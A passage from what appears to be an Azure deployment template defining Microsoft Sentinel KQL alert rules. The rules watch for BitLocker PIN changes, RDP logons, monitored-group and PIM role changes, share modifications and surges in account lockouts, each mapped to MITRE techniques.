        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10502')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10502: [Custom] Windows - Bitlocker Pin Modified",
          "description": "Generates an event when the Bitlocker pin has been modified MITRE: T1486 Category: Windows Security tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1d;\nlet end_time = now();\nlet latency = 0m;\nlet alert_bin = 1d;\nSecurityEvent\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where EventID == 777\n| parse EventData with * 'VolumeMountPoint\">' Volume '<' *\n| extend AlertName = strcat('Bitlocker Pin Changed on ', Computer, ' ', Volume, ' drive')\n| extend ExtendedDescription = strcat(\n    'bv_start_time: ', TimeGenerated\n    ,'\\nbv_src_dvc: ', Computer\n    ,'\\nbv_object: ', Volume\n)\n| project \n    bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_object = Volume\n    , bv_change_action = 'modify'\n    , bv_change_result = 'success'\n    , bv_object_category = 'encryption'\n    , bv_object_attr_category = 'password'\n    , AlertName\n    , ExtendedDescription",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1486"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-10502: [Custom] Windows - {{AlertName}}",
            "alertDescriptionFormat": "Generates an event when the Bitlocker pin has been modified    \n\n{{ExtendedDescription}}\n\nMITRE: T1486\nCategory: Windows Security\ntag: Custom"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-848')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-848')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-848: [Custom] Windows - RDP Connection to a Monitored System",
          "description": "RDP Connection to a Monitored System\n\nInclusion (Required)\n    A848_MONITORED_SYSTEMS: regex for monitored systems MITRE: T1078 Category: Windows Security tag: Custom",
          "severity": "Informational",
          "enabled": false,
          "query": "let EventIDList = dynamic(['4624']);\nlet ingestion_lookback = 1h; // earliest [log time] boundary\nlet generation_lookback =2h; // earliest [log time] boundary\nSecurityEvent\n| where TimeGenerated  > ago(generation_lookback) and ingestion_time() > ago(ingestion_lookback)\n| where A848_MONITORED_SYSTEMS !contains 'regex-to-define-monitored-machines'\n| where EventID in (EventIDList)\n| where LogonType == 10\n| where tolower(Computer) matches regex tolower(A848_MONITORED_SYSTEMS) == true\n| project TimeGenerated, Computer, Account, LogonType, IpAddress, TargetDomainName, TargetUserName",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-893')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-893')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-893: [Custom] Windows - User Removed from Monitored Group",
          "description": "This alert is triggered when a user is removed from a monitored group. MITRE: T1110 Category: Windows Security tag: Custom",
          "severity": "Medium",
          "enabled": false,
          "query": "let start_time = 15m;\nlet end_time = now();\nlet latency = 15m;\nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID == 4729\n| where EventData has_any (A893_MONITORED_GROUPS)\n| project TimeGenerated,AccessMask,Computer,EventID,EventData,SubjectDomainName,SubjectUserName,TargetUserName,TargetDomainName",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT30M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1619')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1619')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1619: [Custom] Azure AD - User Added To PIM",
          "description": "This alert identifies users assigned with an Azure AD role in Privileged Identity Management (PIM).\n\n Exclusion options: \n   * bv_src_user\n   * bv_src_ip\n   * bv_object_attr\n   * bv_object MITRE: T1078 Category: Azure AD tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h; \nAuditLogs\n| where TimeGenerated between (ago(latency + start_time ) .. end_time) and  ingestion_time() >= ago(start_time)\n| where OperationName startswith 'Add member to role'\n|where LoggedByService =~'PIM'\n| where AADOperationType in~ ('ActivateRole', 'AssignPermanentGrantedRole')\n| extend bv_src_user = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| extend bv_src_ip = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n| extend bv_vendor_change_reason = ResultReason\n| mv-apply tr=TargetResources on (\n    extend ResourceType = tostring(tr.type)\n    | extend bv_dest_user = iff(ResourceType == 'User', tr.userPrincipalName, '')\n    | extend bv_object_attr = iff(ResourceType == 'Role', tr.displayName, '')\n    | summarize \n        bv_dest_user = take_any(bv_dest_user)\n        , bv_object_attr = make_set_if(bv_object_attr, isnotempty(bv_object_attr))\n)\n| summarize arg_max(TimeGenerated, *) by CorrelationId\n| extend \n    bv_start_time = TimeGenerated\n    , bv_change_result = Result\n    , bv_src_user\n    , bv_src_ip\n    , bv_dest_user\n    , bv_object = bv_dest_user\n    , bv_object_attr\n    , bv_vendor_action = AADOperationType\n    , bv_change_action = 'modify'\n    , bv_object_category = 'account'\n    , bv_object_attr_category = 'group'\n    , bv_mitre_technique_id = 'T1098'\n| mv-apply e = A1619_EXCLUSIONS on (\n                extend key_count = array_length(bag_keys(e))\n                | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user, true, false)\n                | extend bv_src_ip_excluded = iff(bv_src_ip contains e.bv_src_ip, true, false)\n                | extend bv_object_attr_excluded = iff(bv_object_attr contains e.bv_object_attr, true,false)\n                | extend bv_object_excluded = iff(bv_object contains e.bv_object, true,false)\n                | extend excluded_count = \n                        iff(bv_src_user_excluded and isnotempty(e.bv_src_user), 1,0)\n                        + iff(bv_src_ip_excluded and isnotempty(e.bv_src_ip), 1,0)\n                        + iff(bv_object_attr_excluded and isnotempty(e.bv_object_attr), 1,0)\n                        + iff(bv_object_excluded and isnotempty(e.bv_object) , 1,0)\n                | extend excluded = iff(excluded_count == key_count and key_count != 0, true, false)\n                | summarize excluded=make_set(excluded)\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| extend AttackerEntity = pack_array(bv_src_ip, bv_src_user)\n| extend VictimEntity = pack_array(bv_object)\n| extend ExtendedDescription = strcat(\n                  'bv_src_user: ', bv_src_user\n                  ,'\\nbv_src_ip: ', bv_src_ip\n                  ,'\\nbv_object: ', bv_object\n                  ,'\\nbv_vendor_change_reason: ', bv_vendor_change_reason\n                  ,'\\nbv_object_attr: \\n* ', strcat_array(bv_object_attr, '\\n* ')\n              )\n| extend Class = case(ExcludedEvent == false, 'Custom', 'RBA')\n| extend Tags = case(Class =~ 'RBA', 'tag: RBA', 'tag: Custom')\n| parse bv_src_user with UserName ':' UserUPNSuffix\n| project \n    bv_start_time\n    , bv_change_result\n    , bv_src_user\n    , bv_src_ip\n    , bv_dest_user\n    , bv_object\n    , bv_object_attr\n    , bv_vendor_action\n    , bv_change_action\n    , bv_object_category\n    , bv_object_attr_category\n    , bv_mitre_technique_id\n    , bv_vendor_change_reason\n    , ExtendedDescription\n    , VictimEntity\n    , AttackerEntity\n    , Class\n    , Tags\n    , UserName\n    , UserUPNSuffix\n    , RBAScore = 1",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "DefenseEvasion",
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1619: [Custom] Azure AD - {{bv_object}} added to PIM",
            "alertDescriptionFormat": "This alert identifies users assigned with an Azure AD role in Privileged Identity Management (PIM).\n\n{{ExtendedDescription}}\n\nCategory: Azure AD\n{{Tags}}\nMITRE: T1078"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "UserUPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11016')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11016')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11016: [Custom] Windows - Transient Group Usage",
          "description": "This alert identifies Windows security group activities pertaining to a specfic group and user MITRE: T1098,T1484 Category: Windows Security tag: Custom",
          "severity": "Medium",
          "enabled": false,
          "query": "let EventIDList = dynamic([4728, 4732, 4756, 4729, 4733, 4757]);\nlet start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nlet start_time_historical = 1d;\nlet exclusion_fields = datatable (\n    bv_src_user:string\n    , bv_dest_user: string\n    , bv_group: string     \n    , bv_group_id: string    \n)[];\nlet exclusions = ( T:(\n    bv_src_user:string\n    , bv_dest_user: string\n    , bv_group: string    \n    , bv_group_id: string\n    )\n    , Exclusion: dynamic) {\n    T\n    | mv-apply e = Exclusion on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_array = split(e.bv_src_user, ',')\n        | extend bv_dest_user_array = split(e.bv_dest_user, ',') \n        | mv-apply f = bv_src_user_array on ( \n            extend bv_src_user_excluded = iff(tolower(bv_src_user) contains tolower(f) and isnotempty(f), true, false)\n            | summarize bv_src_user_excluded = countif(bv_src_user_excluded)\n            | extend bv_src_user_excluded = iff(bv_src_user_excluded > 0 , 1, 0)\n        )\n        | mv-apply f = bv_dest_user_array on ( \n            extend bv_dest_user_excluded = iff(bv_dest_user contains tolower(f) and isnotempty(f), true, false)\n            | summarize bv_dest_user_excluded = countif(bv_dest_user_excluded)\n            | extend bv_dest_user_excluded = iff(bv_dest_user_excluded > 0, 1, 0)\n        )\n    | extend bv_group_excluded = iff(bv_group contains e.bv_group and isnotempty(e.bv_group), 1, 0)\n    | extend bv_group_id_excluded = iff(bv_group_id contains e.bv_group_id and isnotempty(e.bv_group_id), 1, 0)    \n    | extend excluded_count = \n                  bv_src_user_excluded\n                  + bv_dest_user_excluded\n                  + bv_group_excluded\n                  + bv_group_id_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n    )\n    | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n    | project-away excluded\n};\nlet AdditionEvents = SecurityEvent\n|where TimeGenerated between (ago(start_time_historical) .. ago(start_time))\n| where EventID  in (array_slice(EventIDList, 0, 2))   \n| project \n      bv_src_user     = tolower(SubjectUserName)\n      , bv_src_dvc    = Computer\n      , bv_event_id   = EventID\n      , bv_start_time = TimeGenerated\n      , bv_workstation = WorkstationName\n      , bv_dest_user = tolower(extract(@'CN=([^=]*),', 1, MemberName))\n      , bv_group = TargetUserName\n      , bv_group_sid = TargetSid\n;      \nSecurityEvent\n|where TimeGenerated between (ago(start_time) .. end_time) \n| where EventID  in (array_slice(EventIDList, 3, -1))      \n| extend HourofDay = tostring(hourofday(TimeGenerated))\n| extend \n      bv_src_user     = tolower(SubjectUserName)\n      , bv_src_dvc    = Computer\n      , bv_event_id   = EventID\n      , bv_start_time = TimeGenerated\n      , bv_workstation = WorkstationName\n      , bv_dest_user = tolower(extract(@'CN=([^=]*),', 1, MemberName))\n      , bv_group = TargetUserName\n      , bv_group_sid = TargetSid\n| union exclusion_fields | invoke exclusions(BV11016_CONFIGURATION['EXCLUSION'])\n| where not(ExcludedEvent)      \n| join kind=rightouter AdditionEvents on bv_dest_user\n| where bv_group == bv_group1 and isnotempty(bv_dest_user)\n| summarize \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_event_id   = make_set(bv_event_id)\n      , bv_activity = make_set(Activity)\n      , bv_group = make_set(bv_group)\n      , bv_dest_user = make_set(bv_dest_user)\n      , bv_group_sid = make_set(bv_group_sid)            \n    by \n      bv_src_user \n| extend VictimEntity = bv_dest_user\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user: ', bv_src_user\n      , '\\nbv_dest_user: ', bv_dest_user \n      , '\\nbv_group: ', bv_group            \n      , '\\nbv_group_sid: \\n* ', strcat_array(bv_group_sid, '\\n* ')\n      , '\\nbv_event_id: \\n* ', strcat_array(bv_event_id, '\\n* ')\n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_event_count\n      , bv_dest_user\n      , bv_activity\n      , bv_group\n      , bv_group_sid\n      , bv_event_id\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = BV11016_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1484"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies Windows security group activities pertaining to a specfic group and user\n\n{{ExtendedDescription}}\n\ntag: Custom\nCategory: Windows Security\nMITRE: T1098 MITRE: T1484"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11010')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11010')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11010: [Custom] Windows - Network Share Object Changed On Monitored Servers",
          "description": "This alert identifies activities from folders and drivers shared on remote systems in Windows Security Logs for a monitored host MITRE: T1135,T1039 Category: Windows Security tag: Custom",
          "severity": "Medium",
          "enabled": false,
          "query": "let EventIDList = dynamic([5142, 5143, 5144]);\nlet start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nSecurityEvent\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)       \n| where Computer has_any (BV11010_CONFIGURATION.MONITORED_HOSTS)\n| extend \n        bv_src_user     = Account\n        , bv_src_dvc    = Computer\n        , bv_event_id   = EventID\n        , bv_start_time = TimeGenerated\n        , bv_workstation = WorkstationName\n        , bv_ip = IpAddress\n        , bv_file_path = ShareLocalPath\n        , bv_file_name = ShareName             \n| mv-apply e = BV11010_CONFIGURATION.EXCLUSION on (\nextend keys = bag_keys(e)\n| extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n| extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n| extend bv_src_dvc_excluded = iff(bv_src_dvc contains e.bv_src_dvc and isnotempty(e.bv_src_dvc), 1, 0)\n| extend bv_workstation_excluded = iff(bv_workstation contains e.bv_workstation and isnotempty(e.bv_workstation), 1, 0)\n| extend bv_ip_excluded = iff(bv_ip contains e.bv_ip and isnotempty(e.bv_ip), 1, 0)\n| extend bv_file_path_excluded = iff(bv_file_path contains e.bv_file_path and isnotempty(e.bv_file_path), 1, 0)\n| extend bv_file_name_excluded = iff(bv_file_name contains e.bv_file_name and isnotempty(e.bv_file_name), 1, 0)            \n| extend excluded_count = \n        bv_src_user_excluded\n        + bv_src_dvc_excluded\n        + bv_workstation_excluded\n        + bv_ip_excluded\n        + bv_file_path_excluded\n        + bv_file_name_excluded\n| extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n| extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n| summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| where not(excluded contains 'true')  \n| summarize \n        bv_src_dvc      = make_set(bv_src_dvc)\n        , bv_event_id   = make_set(bv_event_id)\n        , bv_start_time = min(bv_start_time)\n        , bv_end_time   = max(bv_start_time)\n        , bv_file_path = make_set(bv_file_path)\n        , bv_file_name = make_set(bv_file_name)\n    by \n        bv_src_user\n        , bin_at(bv_start_time, alert_bin, now())            \n| parse bv_src_user with bv_src_user_domain @'\\' bv_src_user_name  \n| extend VictimEntity = pack_array(bv_src_user_name)\n| extend ExtendedDescription = strcat(\n    'bv_src_user:', bv_src_user\n    , '\\nbv_src_dvc: \\n* ', strcat_array(bv_src_dvc, '\\n* ')\n    , '\\nbv_file_path: \\n* ', strcat_array(bv_file_path, '\\n* ')\n    , '\\nbv_file_name: \\n* ', strcat_array(bv_file_name, '\\n* ')                    \n    , '\\n\\nbv_event_id: \\n* ', strcat_array(bv_event_id, '\\n* ')\n)\n| extend bv_rule_version = '1.0.4183'\n| extend bv_rule_timestamp = '1695927160.821612'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4183 bv_rule_timestamp: 1695927160.821612'\n| project \n    bv_start_time\n    , bv_end_time\n    , bv_event_id\n    , bv_src_user\n    , bv_src_user_domain\n    , bv_src_user_name\n    , bv_file_path\n    , bv_file_name\n    , ExtendedDescription\n    , VictimEntity\n    , RBAScore = BV11010_CONFIGURATION['RBASCORE']\n    , bv_rule_combined_string",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery",
            "Collection"
          ],
          "techniques": [
            "T1135",
            "T1039"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies activities from folders and drivers shared on remote systems in Windows Security Logs for a monitored host\n\n{{ExtendedDescription}}\n\ntag: Custom\nCategory: Windows Security\nMITRE: T1135 MITRE: T1039\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10564')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10564')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10564: [Custom] Windows - Significant Increase In Number Of Locked Accounts",
          "description": "Generates an alert when there are multiple locked accounts over an observed period of time. MITRE: T1531,T1110 Category: Windows Security tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let EventIDList = dynamic([4740]);    \nlet start_time_historical = 14d;\nlet start_time = 1d;\nlet end_time = now();\nlet latency = 0d;\nlet alert_bin = 1d;\nlet ALERT_THRESHOLD = 10;\nlet HistoryStats=toscalar(\nSecurityEvent\n| where TimeGenerated between (ago(start_time_historical).. ago(start_time))\n| where EventID in (EventIDList)\n| project TimeGenerated, Computer, Account,AccountSid = TargetSid, bv_dest_dvc = TargetDomainName, Activity, UserName = tolower(TargetUserName)\n| summarize  Start=min(TimeGenerated), End=max(TimeGenerated), total_accounts = count() by bin_at(TimeGenerated, alert_bin, now())\n| summarize Start=min(Start),End=max(End),percentiles(total_accounts,25,50,75,100)\n//My Deviation is a delta bewteen the candle stick body.\n| extend MyDev = (percentile_total_accounts_75 - percentile_total_accounts_25)*1.0\n| where MyDev > 0 // can set this to -1 to force test results, 0 is default\n| extend MyVar = MyDev / percentile_total_accounts_100 //My Variance is a percentage of My Deviation from the max value\n| extend MyVarDev = MyDev * MyVar //Multiply My Deviation by My Variance so as to soften it for the final outlier calculation\n| project GreaterThanThis = percentile_total_accounts_100 + MyVarDev\n);\nlet TodayStats = (\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time).. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| project TimeGenerated, Computer, Account,AccountSid = TargetSid, bv_dest_dvc = TargetDomainName, Activity, UserName = tolower(TargetUserName)     \n| summarize  TimeGenerated=min(TimeGenerated), TodayCount = dcount(UserName) by TimeBin = bin_at(TimeGenerated, alert_bin, now())\n);\nTodayStats\n| extend Delta = TodayCount - HistoryStats\n| where Delta > 0\n| where TodayCount > ALERT_THRESHOLD\n| extend ExpectedMaximum = HistoryStats\n| extend ExtendedDescription = strcat('Multiple locked accounts with ', TodayCount,' events when the expected maximum was ', ExpectedMaximum)\n| project \n    bv_start_time = TimeBin\n    , TodayCount\n    , ExpectedMaximum\n    , ExtendedDescription\n    , RBAScore = 1",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "CredentialAccess"
          ],
          "techniques": [
            "T1531",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an alert when there are multiple locked accounts over an observed period of time.\n\n{{ExtendedDescription}}\n\nMITRE: T1531 MITRE: T1110\nCategory: Windows Security\ntag: Custom"
          },
          "customDetails": {
            "RBAScore": "RBAScore"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11020')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11020')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11020: [Custom] Windows - Monitored Group Changed",
          "description": "Generates an alert when there are security-enabled monitored group changes over an observed period of time. MITRE: T1098,T1484 Category: Windows Security tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let EventIDList = dynamic([4737, 4730, 4728, 4729, 4732, 4733, 4734, 4756, 4757, 4758, 4764]);\nlet latency = 15m;\nlet start_time = 15m;\nlet end_time = now();\nlet alert_bin = 15m;\nSecurityEvent\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| extend bv_dest_user = extract(@'CN=([^=]*),', 1, MemberName)\n| extend bv_object = bv_dest_user\n| project TimeGenerated, bv_src_user = tolower(SubjectUserName), bv_src_user_sid = SubjectUserSid, bv_group = TargetUserName, bv_group_sid = TargetSid, bv_activity = Activity, bv_dest_user, bv_dest_user_sid = MemberSid, bv_object, bv_dest_dvc = Computer\n| mv-apply inclusion = BV11020_CONFIG.MONITORED_GROUP on (\n  //Match entites to each row of the inclusion\n  extend IncludedGroup = iff(bv_group has tostring(inclusion[0]) and isnotempty(inclusion[0]), 1, 0)\n  | extend IncludedGroupSID = iff(bv_group_sid has tostring(inclusion[1]) and isnotempty(inclusion[1]), 1, 0)\n  | extend IncludedCount = IncludedGroup + IncludedGroupSID\n  | summarize included = make_set_if(IncludedCount, IncludedCount > 0)\n)\n| extend IncludedEvent = iff(included <> '[]', true, false)\n| where IncludedEvent      \n| mv-apply e = BV11020_CONFIG.EXCLUSION on (\n  extend keys = bag_keys(e)\n  | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n  | extend bv_src_user_excluded = iff(bv_src_user contains 